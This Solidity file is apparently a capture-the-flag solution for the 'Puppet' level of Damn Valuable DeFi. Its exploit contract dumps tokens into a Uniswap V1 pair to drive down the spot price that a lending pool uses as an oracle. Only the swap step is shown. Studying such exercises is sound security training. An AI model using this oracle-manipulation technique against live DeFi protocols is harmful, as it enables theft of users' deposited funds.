// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "../../DamnValuableToken.sol";

interface IPuppetPool {
    function borrow(uint256 borrowAmount) external;
}

interface UniswapV1Pair {
    function tokenToEthSwapInput(
        uint256 tokens_sold,
        uint256 min_eth,
        uint256 deadline
    ) external returns (uint256);
}

contract PuppetExploit {
    address public owner;
    DamnValuableToken public token;
    UniswapV1Pair public uniswapPair;
    IPuppetPool public pool;

    constructor(
        address _pool,
        address _owner,
        address _uniswapPair,
        address _token
    ) public {
        pool = IPuppetPool(_pool);
        owner = _owner;
        uniswapPair = UniswapV1Pair(_uniswapPair);
        token = DamnValuableToken(_token);
    }

    function attack(uint256 tokens) public {
        uniswapPair.tokenToEthSwapInput(tokens, 0, block.timestamp);
    }
}
